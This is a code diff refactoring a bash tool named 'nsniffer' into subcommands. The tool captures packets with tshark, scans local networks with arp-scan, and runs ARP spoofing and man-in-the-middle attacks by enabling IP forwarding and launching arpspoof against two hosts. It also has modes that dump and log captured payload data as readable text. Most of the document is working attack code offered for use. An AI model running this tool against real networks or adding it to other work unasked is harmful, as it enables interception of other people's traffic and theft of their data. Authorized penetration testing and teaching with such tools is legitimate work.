@@ -1,9 +1,25 @@
 #!/usr/bin/env bash
-
+# ==============================================================================
+# nsniffer - Tool for capturing, analyzing, and performing MITM attacks on local networks
+#
+# Examples:
+#   nsniffer capture -i eth0 -o output.pcap -f "tcp" [--live]
+#   nsniffer analyze output.pcap
+#   nsniffer mitm eth0 192.168.0.1 192.168.0.2
+#   nsniffer arp eth0 192.168.0.1 192.168.0.2
+#   nsniffer scan eth0
+#   nsniffer list
+#   nsniffer extract file.pcap
+#   nsniffer log eth0 capture.log
+#   nsniffer setup
+#   nsniffer help
+# ==============================================================================
 set -euo pipefail
 IFS=$'\n\t'
 
-# --- Setup Colors and Symbols ---
+# ------------------------------------------------------------------------------
+# Colors and symbols
+# ------------------------------------------------------------------------------
 setup_colors() {
   redColor="\e[0;31m"
   greenColor="\e[0;32m"
@@ -11,14 +27,13 @@ setup_colors() {
   blueColor="\e[0;34m"
   purpleColor="\e[0;35m"
   cyanColor="\e[0;36m"
-  grayColor="\e[0;37m"
-  resetColor=" \e[0m"
+  resetColor="\e[0m"
 
-  plus="${greenColor}[+]${resetColor}"
-  error="${redColor}[x]${resetColor}"
-  warning="${yellowColor}[!]${resetColor}"
-  question="${purpleColor}[?]${resetColor}"
-  double_colon="${cyanColor}::${resetColor}"
+  plus="${greenColor}[+] ${resetColor}"
+  error="${redColor}[x] ${resetColor}"
+  warning="${yellowColor}[!] ${resetColor}"
+  question="${purpleColor}[?] ${resetColor}"
+  double_colon="${cyanColor}:: ${resetColor}"
 }
 
 print_with_color() {
@@ -29,279 +44,406 @@ print_with_color() {
 
 setup_colors
 
+# ------------------------------------------------------------------------------
+# Help function
+# ------------------------------------------------------------------------------
 print_help() {
   cat <<EOF
-Usage: $0 [OPTIONS]
+Usage: nsniffer <subcommand> [options]
 
-Options:
-  -i, --interface   Network interface to capture traffic (required). Example: -i eth0
-  -o, --output      Output file to save captured packets (default: output.pcap). Example: -o capture.pcap
-  -f, --filter      Capture filter for TShark (optional). Example: -f "tcp.port == 80"
-  -a, --analyze     Analyze the data after capture.
-  -m, --mitm        Perform a Man-in-the-Middle attack. Example: -m 192.168.0.1 192.168.0.2
-  -s, --scan        Scan for ARP devices on the local network.
-  -l, --list        List available network interfaces.
-  -x, --extract     Extract hexadecimal data in human-readable text.
-  -I, --interactive Enter interactive mode for controlled captures. Example: -I -g capture.log
-  -g, --log         Capture real-time traffic and save extracted data in a log. Example: -g capture.log
-  -h, --help        Display this help message.
-  -arp, --arp       Perform ARP spoofing for a single target. Example: -arp 192.168.0.1 192.168.0.2
-  -live, --live     Display captured packets in real-time during capture. Example: -i eth0 -f "tcp" -o capture.pcap --live
-  -setup, --setup   Install necessary packages for the tool.
-  -debug, --debug   Enable debug mode to show additional logs.
+Subcommands:
+  capture    Capture traffic with TShark.
+             Ex: nsniffer capture -i eth0 -o file.pcap -f "tcp" --live
+
+  analyze    Analyze a pcap file.
+             Ex: nsniffer analyze file.pcap
+
+  mitm       Man-in-the-Middle attack with ARP spoofing (requires IP forwarding).
+             Ex: nsniffer mitm eth0 192.168.0.1 192.168.0.2
+
+  arp        ARP spoofing for a single target.
+             Ex: nsniffer arp eth0 192.168.0.1 192.168.0.2
+
+  scan       Scan the local network for devices.
+             Ex: nsniffer scan eth0
+
+  list       List available network interfaces.
+
+  extract    Extract hexadecimal data in readable text from a pcap file.
+             Ex: nsniffer extract file.pcap
+
+  log        Capture traffic at intervals and save extracted data to a log.
+             Ex: nsniffer log eth0 capture.log
+
+  setup      Install (or attempt to install) necessary dependencies:
+             tshark, arpspoof, arp-scan
+
+  help       Show this help message.
 EOF
 }
 
-
-setup_environment() {
-  print_with_color "$double_colon" "Installing necessary packages for the tool..."
-  if [ -f /etc/debian_version ]; then
-    apt update && apt install -y tshark dsniff arp-scan
-  elif [ -f /etc/redhat-release ]; then
-    yum install -y tshark dsniff arp-scan
-  elif [ -f /etc/arch-release ]; then
-    pacman -Sy --noconfirm wireshark-qt dsniff arp-scan
+# ------------------------------------------------------------------------------
+# Unified dependency check/installation
+# ------------------------------------------------------------------------------
+check_or_install_dependencies() {
+  if [[ -f /etc/debian_version ]]; then
+    apt-get update -qq
+    PKG_INSTALL="apt-get install -y"
+  elif [[ -f /etc/redhat-release ]]; then
+    yum install -y epel-release
+    PKG_INSTALL="yum install -y"
+  elif [[ -f /etc/arch-release ]]; then
+    pacman -Sy --noconfirm
+    PKG_INSTALL="pacman -S --noconfirm"
   else
-    print_with_color "$warning" "Unsupported operating system. Please install manually: tshark, dsniff, arp-scan."
+    echo "Unsupported distro. Please install dependencies manually."
     exit 1
   fi
-}
 
-validate_dependencies() {
-  local dependencies=(tshark arpspoof arp-scan)
-  for dep in "${dependencies[@]}"; do
-    if ! command -v "$dep" >/dev/null 2>&1; then
-      print_with_color "$error" "Dependency $dep is not installed. Please install it and try again."
-      exit 1
+  local -a deps=("tshark" "arpspoof" "arp-scan")
+  local -a to_install=()
+
+  for cmd in "${deps[@]}"; do
+    if ! command -v "$cmd" &>/dev/null; then
+      case "$cmd" in
+        arpspoof) to_install+=("dsniff") ;;
+        tshark)
+          if [[ -f /etc/arch-release ]]; then
+            to_install+=("wireshark-cli")
+          else
+            to_install+=("tshark")
+          fi
+          ;;
+        arp-scan) to_install+=("arp-scan") ;;
+      esac
     fi
   done
+
+  if [[ ${#to_install[@]} -eq 0 ]]; then
+    echo "All dependencies are already installed."
+  else
+    eval "$PKG_INSTALL ${to_install[*]}"
+    echo "Installed: ${to_install[*]}"
+  fi
 }
 
-validate_arguments() {
-  local interface="$1"
-  if [[ -z "$interface" ]]; then
-    print_with_color "\n$error" "You must specify a network interface with -i.\n"
-    print_help
+# ------------------------------------------------------------------------------
+# Subcommand: setup
+# ------------------------------------------------------------------------------
+setup_environment() {
+  print_with_color "$double_colon" "Installing/verifying dependencies..."
+  check_or_install_dependencies
+}
+
+# ------------------------------------------------------------------------------
+# List network interfaces
+# ------------------------------------------------------------------------------
+list_interfaces() {
+  print_with_color "$double_colon" "Available network interfaces:"
+  ip -o link show | awk -F': ' '{print $2}' | grep -v "lo"
+}
+
+# ------------------------------------------------------------------------------
+# Subcommand: scan (ARP scan)
+# ------------------------------------------------------------------------------
+scan_network() {
+  local interface="${1:-}"
+  [ -z "$interface" ] && {
+    print_with_color "\n$warning" "Interface missing. Use the 'list' subcommand to see available interfaces."
+    return 1
+  }
+  print_with_color "$double_colon" "Scanning network devices on $interface..."
+  arp-scan --interface "$interface" --localnet
+}
+
+# ------------------------------------------------------------------------------
+# Validate that an interface exists
+# ------------------------------------------------------------------------------
+validate_interface() {
+  local iface="$1"
+  if [[ -z "$iface" ]]; then
+    print_with_color "$error" "You must specify a network interface."
     exit 1
   fi
 }
 
+# ------------------------------------------------------------------------------
+# Subcommand: capture (traffic capture)
+# ------------------------------------------------------------------------------
 capture_traffic() {
-  local interface=$1
-  local output_file=$2
-  local filter=${3:-}
-  local live_mode=${4:-false}
+  local interface=""
+  local output_file="output.pcap"
+  local filter=""
+  local live_mode=false
 
-  print_with_color "$blueColor" "Starting capture on $interface with filter: ${filter:-no filter}"
+  # Capture-specific flags
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      -i|--interface)
+        interface="$2"
+        shift 2
+        ;;
+      -o|--output)
+        output_file="$2"
+        shift 2
+        ;;
+      -f|--filter)
+        filter="$2"
+        shift 2
+        ;;
+      -live|--live)
+        live_mode=true
+        shift
+        ;;
+      *)
+        print_with_color "$warning" "Unknown option for 'capture': $1"
+        exit 1
+        ;;
+    esac
+  done
+
+  validate_interface "$interface"
+  print_with_color "$blueColor" "Starting capture on $interface with filter: ${filter:-<no filter>}"
 
   if $live_mode; then
     tshark -i "$interface" ${filter:+-f "$filter"} -w "$output_file" -x || {
-      print_with_color "$error" "Error capturing traffic in live mode."
+      print_with_color "$error" "Error capturing in live mode."
       exit 1
     }
   else
     tshark -i "$interface" ${filter:+-f "$filter"} -w "$output_file" || {
-      print_with_color "$error" "Error capturing traffic."
+      print_with_color "$error" "Error capturing."
       exit 1
     }
   fi
+
+  print_with_color "$plus" "Capture finished. File saved to: $output_file"
 }
 
-capture_and_log() {
-  local interface=$1
-  local log_file=$2
-  local output_file="$log_file.pcap"
+# ------------------------------------------------------------------------------
+# Subcommand: analyze (analyze a pcap)
+# ------------------------------------------------------------------------------
+analyze_traffic() {
+  if [[ $# -lt 1 ]]; then
+    print_with_color "$error" "You must specify a pcap file to analyze."
+    exit 1
+  fi
 
-  print_with_color "$greenColor" "Starting capture on interface $interface."
-  while true; do
-    tshark -i "$interface" -a duration:5 -w "$output_file" >/dev/null 2>&1 || {
-      print_with_color "$error" "Error creating temporary capture file."
-      exit 1
-    }
+  local pcap_file="$1"
 
-    print_with_color "$greenColor" "Extracting data from pcap file..."
-    echo -e "\n--- Capture started at $(date '+%Y-%m-%d %H:%M:%S') ---\n" >>"$log_file"
-    tshark -r "$output_file" -T fields -e data | while read -r line; do
-      [ -n "$line" ] && echo "$line" | xxd -r -p >>"$log_file"
-    done
-    echo -e "\n--- Capture ended at $(date '+%Y-%m-%d %H:%M:%S') ---\n" >>"$log_file"
+  if [ ! -s "$pcap_file" ]; then
+    print_with_color "$error" "File '$pcap_file' is empty or does not exist."
+    exit 1
+  fi
 
-    print_with_color "$greenColor" "Data added to log: $log_file."
-    [[ $AUTO_MODE != true ]] && {
-      print_with_color "$cyanColor" "Press Enter to continue or Ctrl+C to exit."
-      read -r
-    }
-  done
+  print_with_color "$blueColor" "Analyzing $pcap_file:"
+  tshark -r "$pcap_file" -T text
 }
 
-run_arpspoof() {
+# ------------------------------------------------------------------------------
+# ARP Spoofing (subcommand: arp)
+# ------------------------------------------------------------------------------
+start_arpspoof() {
   local interface="$1"
   local target="$2"
   local victim="$3"
 
   print_with_color "$double_colon" "Starting ARP spoofing: Target=$target, Victim=$victim"
   arpspoof -i "$interface" -t "$target" "$victim" &
+  echo $!  # Return PID
 }
 
-arpspoof_mitm() {
-  local interface=$1
-  local target1=$2
-  local target2=$3
-
-  print_with_color "$double_colon" "Starting MITM between $target1 and $target2 on $interface."
-  echo 1 >/proc/sys/net/ipv4/ip_forward
-  run_arpspoof "$interface" "$target1" "$target2"
-  run_arpspoof "$interface" "$target2" "$target1"
-  trap handle_interrupt SIGINT
-  wait
-}
-
-scan_network() {
-  local interface=$1
-  print_with_color "$double_colon" "Scanning devices on the network..."
-  arp-scan --interface "$interface" --localnet
-}
-
-list_interfaces() {
-  print_with_color "$double_colon" "Available network interfaces:"
-  ip -o link show | awk -F': ' '{print $2}' | grep -v "lo"
-}
-
-analyze_traffic() {
-  local pcap_file=$1
-  if [ ! -s "$pcap_file" ]; then
-    print_with_color "$error" "Error: Empty or nonexistent file."
-    exit 1
-  fi
-  tshark -r "$pcap_file" -T text
-}
-
+# ------------------------------------------------------------------------------
+# Interrupt handler (cleans processes and IP forwarding)
+# ------------------------------------------------------------------------------
 handle_interrupt() {
+  local pids=("$@")  # Receive all PIDs to terminate
   print_with_color "$warning" "Interrupt detected. Cleaning up..."
-  pkill -f arpspoof || true
-  echo 0 >/proc/sys/net/ipv4/ip_forward
+  for pid in "${pids[@]}"; do
+    kill "$pid" 2>/dev/null || true
+  done
+  # Disable IP forwarding
+  echo 0 > /proc/sys/net/ipv4/ip_forward
   exit 0
 }
 
-extract_pcap() {
-  local file=$1
-  if [ ! -f "$file" ]; then
-    print_with_color "$error" "Error: The pcap file does not exist."
+# ------------------------------------------------------------------------------
+# Subcommand: arp (one victim or one target)
+# ------------------------------------------------------------------------------
+arp_spoof_single() {
+  if [[ $# -lt 3 ]]; then
+    print_with_color "$error" "Usage: nsniffer arp <interface> <target1> <target2>"
     exit 1
   fi
 
+  local interface="$1"
+  local target1="$2"
+  local target2="$3"
+  validate_interface "$interface"
+
+  # Start arpspoof and wait
+  pid=$(start_arpspoof "$interface" "$target1" "$target2")
+  trap "handle_interrupt $pid" SIGINT
+  wait
+}
+
+# ------------------------------------------------------------------------------
+# Subcommand: mitm (two targets)
+# ------------------------------------------------------------------------------
+arpspoof_mitm() {
+  if [[ $# -lt 3 ]]; then
+    print_with_color "$error" "Usage: nsniffer mitm <interface> <target1> <target2>"
+    exit 1
+  fi
+
+  local interface="$1"
+  local target1="$2"
+  local target2="$3"
+  validate_interface "$interface"
+
+  print_with_color "$double_colon" "Enabling IP forwarding for MITM..."
+  echo 1 > /proc/sys/net/ipv4/ip_forward
+
+  local pid1 pid2
+  pid1=$(start_arpspoof "$interface" "$target1" "$target2")
+  pid2=$(start_arpspoof "$interface" "$target2" "$target1")
+
+  trap "handle_interrupt $pid1 $pid2" SIGINT
+  wait
+}
+
+# ------------------------------------------------------------------------------
+# Subcommand: extract (hex data extraction)
+# ------------------------------------------------------------------------------
+extract_pcap() {
+  if [[ $# -lt 1 ]]; then
+    print_with_color "$error" "You must specify a pcap file to extract data from."
+    exit 1
+  fi
+
+  local file="$1"
+  if [ ! -f "$file" ]; then
+    print_with_color "$error" "Pcap file '$file' does not exist."
+    exit 1
+  fi
+
+  print_with_color "$blueColor" "Extracting data from $file:"
   tshark -r "$file" -Y "frame.len > 100" -T fields -e data | while read -r line; do
     [ -n "$line" ] && echo "$line" | xxd -r -p
   done
 }
 
+# ------------------------------------------------------------------------------
+# Subcommand: log (capture and record data at intervals)
+# ------------------------------------------------------------------------------
+extract_and_append() {
+  local pcap_file="$1"
+  local log_file="$2"
 
+  print_with_color "$greenColor" "Extracting data from: $pcap_file"
+  echo -e "\n--- Capture started at $(date '+%Y-%m-%d %H:%M:%S') ---\n" >> "$log_file"
+
+  tshark -r "$pcap_file" -T fields -e data | while read -r line; do
+    [ -n "$line" ] && echo "$line" | xxd -r -p >> "$log_file"
+  done
+
+  echo -e "\n--- Capture ended at $(date '+%Y-%m-%d %H:%M:%S') ---\n" >> "$log_file"
+  print_with_color "$plus" "Data appended to log: $log_file"
+}
+
+capture_and_log() {
+  local interface="$1"
+  local log_file="$2"
+  local interval="${3:-5}"
+  local output_file="${log_file}.pcap"
+
+  print_with_color "$greenColor" "Starting capture on $interface (interval=${interval}s)."
+
+  while true; do
+    # Start tshark
+    tshark -i "$interface" -w "$output_file" >/dev/null 2>&1 &
+    local tshark_pid=$!
+
+    # Wait for the interval
+    sleep "$interval"
+    kill "$tshark_pid" 2>/dev/null || true
+
+    extract_and_append "$output_file" "$log_file"
+    print_with_color "$cyanColor" "Press Enter to continue or Ctrl+C to exit."
+    read -r
+  done
+}
+
+log_traffic() {
+  if [[ $# -lt 2 ]]; then
+    print_with_color "$error" "Usage: nsniffer log <interface> <log_file> [interval]"
+    exit 1
+  fi
+
+  local interface="$1"
+  local log_file="$2"
+  local interval="${3:-5}"
+  validate_interface "$interface"
+
+  capture_and_log "$interface" "$log_file" "$interval"
+}
+
+# ------------------------------------------------------------------------------
+# MAIN (subcommands)
+# ------------------------------------------------------------------------------
 main() {
-  if [ "$(id -u)" -ne 0 ]; then
+  # Ensure the script is run as root
+  if [[ "$(id -u)" -ne 0 ]]; then
     print_with_color "$error" "This script must be run as root."
     exit 1
   fi
 
-  local interface=""
-  local output_file="output.pcap"
-  local filter=""
-  local analyze=false
-  local mitm=false
-  local scan=false
-  local target1=""
-  local target2=""
-  local arpspoof=false
-  local debug_mode=false
-  local live_mode=false
-
-  while [[ $# -gt 0 ]]; do
-    case $1 in
-      -i|--interface)
-        interface=$2
-        shift 2
-        ;;
-      -o|--output)
-        output_file=$2
-        shift 2
-        ;;
-      -f|--filter)
-        filter=$2
-        shift 2
-        ;;
-      -debug|--debug)
-        debug_mode=true
-        shift
-        ;;
-      -a|--analyze)
-        analyze=true
-        shift
-        ;;
-      -m|--mitm)
-        target1=$2
-        target2=$3
-        mitm=true
-        shift 3
-        ;;
-      -arp|--arp)
-        target1=$2
-        target2=$3
-        arpspoof=true
-        shift 3
-        ;;
-      -s|--scan)
-        scan=true
-        shift
-        ;;
-      -setup|--setup)
-        setup_environment
-        exit 0
-        ;;
-      -l|--list)
-        list_interfaces
-        exit 0
-        ;;
-      -x|--extract)
-        extract_pcap $2
-        exit 0
-        ;;
-      -g|--log)
-        log_file=$2
-        capture_and_log "$interface" "$log_file"
-        exit 0
-        ;;
-      -live|--live)
-        live_mode=true
-        shift
-        ;;
-      -h|--help)
-        print_help
-        exit 0
-        ;;
-      *)
-        print_with_color "$warning" "Unknown option: $1"
-        print_help
-        exit 1
-        ;;
-    esac
-  done
-
-  validate_dependencies
-  validate_arguments "$interface"
-
-  if $debug_mode; then
-    set -x
+  # Check the first argument (subcommand)
+  local subcommand="${1:-}"
+  if [[ -z "$subcommand" ]]; then
+    print_help
+    exit 0
   fi
+  shift
 
-  if $scan; then
-    scan_network "$interface"
-  elif $mitm; then
-    arpspoof_mitm "$interface" "$target1" "$target2"
-  elif $arpspoof; then
-    run_arpspoof "$interface" "$target1" "$target2"
-  else
-    capture_traffic "$interface" "$output_file" "$filter" "$live_mode"
-    $analyze && analyze_traffic "$output_file"
-  fi
+  # Interpret subcommand
+  case "$subcommand" in
+    help|-h|--help)
+      print_help
+      ;;
+    setup)
+      setup_environment
+      ;;
+    list)
+      list_interfaces
+      ;;
+    scan)
+      scan_network "$@"
+      ;;
+    capture)
+      capture_traffic "$@"
+      ;;
+    analyze)
+      analyze_traffic "$@"
+      ;;
+    arp)
+      arp_spoof_single "$@"
+      ;;
+    mitm)
+      arpspoof_mitm "$@"
+      ;;
+    extract)
+      extract_pcap "$@"
+      ;;
+    log)
+      log_traffic "$@"
+      ;;
+    *)
+      print_with_color "$warning" "Unknown subcommand: $subcommand"
+      print_help
+      exit 1
+      ;;
+  esac
 }
 
 main "$@"
